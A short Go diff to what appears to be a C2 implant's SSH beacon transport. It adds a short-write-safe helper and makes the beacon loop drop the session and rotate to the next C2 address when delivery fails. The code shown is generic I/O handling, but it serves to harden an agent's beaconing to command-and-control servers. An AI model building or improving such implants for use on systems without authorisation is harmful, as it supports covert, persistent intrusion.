@@ -84,6 +84,25 @@ func subtleEqualSSHKeys(a, b ssh.PublicKey) bool {
 	return string(a.Marshal()) == string(b.Marshal())
 }
 
+// writeSSHBody writes the whole beacon envelope to the SSH channel. io.Writer
+// permits short writes with a nil error; the old single Write ignored both n
+// and err, so a partial write still ran the remote `cat` and returned a reply
+// for a truncated frame. The server rejected it and the agent saw a "beacon
+// failure" with no hint that delivery was the problem.
+func writeSSHBody(w io.Writer, body []byte) error {
+	for len(body) > 0 {
+		n, err := w.Write(body)
+		if err != nil {
+			return err
+		}
+		if n <= 0 {
+			return io.ErrShortWrite
+		}
+		body = body[n:]
+	}
+	return nil
+}
+
 func sendSSHBeacon(body []byte) []byte {
 	initSSHConfig()
 	startIdx := int(currentC2Idx.Load())
@@ -163,9 +182,17 @@ func sendSSHBeacon(body []byte) []byte {
 			continue
 		}
 
-		// Input delivery is best-effort; the remote exit status carries the
-		// outcome for the caller below.
-		_, _ = stdin.Write(body)
+		// Delivery is part of the exchange now: a short write must not be
+		// followed by a read that looks like a failed beacon.
+		if err := writeSSHBody(stdin, body); err != nil {
+			if Debug {
+				fmt.Printf("[!] SSH write to %s failed: %v\n", addr, err)
+			}
+			stdin.Close()
+			session.Close()
+			client.Close()
+			continue
+		}
 		stdin.Close()
 
 		type sshReadResult struct {
